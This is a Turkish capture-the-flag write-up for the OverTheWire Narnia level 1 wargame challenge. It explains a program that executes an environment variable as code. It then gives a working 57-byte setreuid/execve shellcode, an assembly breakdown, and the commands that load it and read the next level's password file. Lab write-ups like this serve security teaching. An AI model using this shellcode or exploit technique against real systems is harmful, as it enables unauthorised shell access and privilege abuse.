# OverTheWire — Narnia Level 1 → 2

> Hedef: `narnia1`'den `narnia2` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `EGG` environment variable'ına **shellcode** koyup çalıştırma.

---

## 1. Bağlantı
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
int main(){
    int (*ret)();
    if(getenv("EGG") == NULL){ printf("Give me something...\n"); exit(1); }
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");   // ret = EGG'in adresi
    ret();                 // o adresteki BYTE'LARI KOD olarak çalıştır
}
```

## 3. Zafiyet
Program, `EGG`'in adresini fonksiyon pointer'a atayıp **doğrudan çağırıyor**. Klasik overflow
yok — program kullanıcı verisini kod olarak işliyor.
- Adres bulmaya **gerek yok** (program `getenv` ile kendisi buluyor).
- NOP sled **gerekmez** (`ret()` tam shellcode'un başına atlıyor).
- stdin/pipe/cat derdi yok (binary stdin okumuyor).

## 4. Shellcode (null-free, 57 byte) — `setreuid` + `execve("/bin/sh")`
| Byte'lar | Assembly | Açıklama |
|----------|----------|----------|
| `31 c0` `b0 c9` `cd 80` | `xor eax,eax; mov al,0xc9; int 0x80` | geteuid32 → eax=euid |
| `89 c3` `89 c1` | `mov ebx,eax; mov ecx,eax` | ruid=euid=euid |
| `31 c0` `b0 cb` `cd 80` | `xor eax,eax; mov al,0xcb; int 0x80` | setreuid32(euid,euid) |
| `31 c0` `50` | `xor eax,eax; push eax` | string NUL |
| `b8 2e 72 69 01` `35 01 01 01 01` `50` | `mov eax,..; xor eax,0x01010101; push` | `"/sh\0"` (XOR ile) |
| `b8 2e 63 68 6f` `35 01 01 01 01` `50` | `mov eax,..; xor eax,..; push` | `"/bin"` (XOR ile) |
| `89 e3` | `mov ebx,esp` | ebx → "/bin/sh" |
| `31 c0 50 53 89 e1` | argv=["/bin/sh",0]; `mov ecx,esp` | ecx → argv |
| `31 d2` `31 c0 b0 0b cd 80` | `xor edx,edx; execve` | execve("/bin/sh",argv,0) |

> `"/bin/sh"` string'i `XOR 0x01010101` ile runtime'da kuruluyor (env var için aslında
> slash sorunu yok ama null-free olması yeterli; bu repo standardı shellcode'u taşıdım).
> Alternatif: klasik 25-byte execve shellcode (`\x31\xc0\x50\x68...`) de çalışır.

## 5. Exploit
```bash
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\xb8\x2e\x72\x69\x01\x35\x01\x01\x01\x01\x50\xb8\x2e\x63\x68\x6f\x35\x01\x01\x01\x01\x50\x89\xe3\x31\xc0\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")')
python3 -c '
import sys,time
time.sleep(0.5)
sys.stdout.buffer.write(b"id; cat /etc/narnia_pass/narnia2\n"); sys.stdout.flush(); time.sleep(1.0)
' | /narnia/narnia1
```
Çıktı: `Trying to execute EGG!` → `uid=14002(narnia2)` → şifre.



## Dersler
| Konu | Not |
|------|-----|
| Veri = kod | Fonksiyon pointer'a atanıp çağrılan kullanıcı verisi → shellcode yeter |
| Adres derdi yok | `getenv` + `ret()` tam başa atlıyor → NOP sled gereksiz |
| null-free shellcode | env var null içeremez (string sonu) |
| setreuid | euid'i (narnia2) sabitle, shell yetki düşürmesin |
